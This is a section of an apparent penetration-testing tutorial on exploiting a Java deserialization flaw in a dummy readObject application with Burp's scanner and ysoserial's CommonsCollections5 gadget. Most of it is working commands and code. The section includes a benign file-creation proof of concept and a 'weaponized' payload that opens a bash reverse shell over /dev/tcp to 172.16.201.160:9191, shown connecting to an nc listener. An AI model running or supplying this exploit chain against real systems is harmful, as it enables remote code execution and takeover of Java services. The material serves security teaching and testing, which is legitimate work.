#### 3.1. Info

The following example will show how to exploit a deserialization vulnerability triggered via `readObject` method in a dummy test application.

Scenario:

- vulnerability was detected via Burp extension `https://github.com/federicodotta/Java-Deserialization-Scanner`
  - `Apache Commons Collections 3 Alternate payload 2 (Sleep)`

- our task is to exploit the vulnerability via `https://github.com/frohoff/ysoserial` 
  - this provides user-defined payloads (unlike benign `sleep` command)
  - `CommonsCollections5` payload is similar to Burp's


#### 3.2. Match the Burp scanner payload with the `yseoserial` gadget

```
# payload_str=`grep -r 'Commons Collections 3 Alternate payload 2 (Sleep)' ~/Java-Deserialization-Scanner | grep -oE '\"rO0AB.*\"' | tr -d '"' | tr -d '\n' | head -c 32`
# options=`java -jar ~/ysoserial.jar 2>&1 | grep -i 'commons-collections:3.1' | awk '{print $1}'`
# for i in $options; do java -jar ~/ysoserial.jar $i ls 2>/dev/null | base64 | grep -oE $payload_str && echo $i; done
rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50
CommonsCollections5
```
Note: this indicates that `CommonsCollections5` from `yseoserial` is the gadget identified to work with the target.


#### 3.3. Project setup (vulnerable application)

a) The following code `/tmp/java_serial/Main.java` simply reads a file that contains a serialized Java steam, attempts to re-build the original Java object:
```
import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException, ClassNotFoundException {
        if (args.length != 1) return;
        String filename = args[0];
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object whatever = ois.readObject(); // hereby the vulnerable code
    }
}
```

b) After building `ysoserial` from source, all JAR dependencies that contain the required gadgets can be found under the local `maven` repository:
```
# find ~/.m2 -regex ".*commons.*collections.*3.1.*.jar" -exec cp -- "{}" /tmp/java_serial/ \;
```

c) Project structure - `/tmp/java_serial`:
```
# tree
.
├── collections5.serial
├── commons-collections-3.1.jar
└── Main.java

0 directories, 3 files
```

d) Compiling the program:
```
# javac Main.java # compile as regular Java program
# javac -cp commons-collections-3.1.jar: Main.java # in case classes from JAR file are imported in the Java program
```


#### 3.4. Exploitation - part 1 (benign)

Note:
- it is enough to provide the gadget JAR as part of the Java Class Path when running the application (similar to WebLogic)
- after running the program, successful exploitation creates `/tmp/this_is_a_test` file

a) Generate the `ysoserial` payload for `CommonsCollections5`:
```
# java -jar ~/ysoserial.jar CommonsCollections5 'touch /tmp/this_is_a_test' > /tmp/java_serial/collections5.serial
```

b) Exploitation - PoC:
```
# [ -e /tmp/this_is_a_test ] && echo 'OK' # does not print out anything
# java -cp commons-collections-3.1.jar: Main collections5.serial
# [ -e /tmp/this_is_a_test ] && echo 'OK'
OK
```


#### 3.5. Exploitation - part 2 (weaponized)

Note: remember to patch `ysoserial` - `CommonsCollections5.java` before running complex commands as part of your payload.

a) Generate the `ysoserial` payload for `CommonsCollections5`:
```
# java -jar ~/ysoserial.jar CommonsCollections5 "/bin/bash -i >& /dev/tcp/172.16.201.160/9191 0>&1" > /tmp/java_serial/collections5.serial
```

b) Exploitation - PoC:
```
# java -cp commons-collections-3.1.jar: Main collections5.serial
# nc -nlvp 9191
listening on [any] 9191 ...
connect to [172.16.201.160] from (UNKNOWN) [172.16.201.160] 56546
...
```
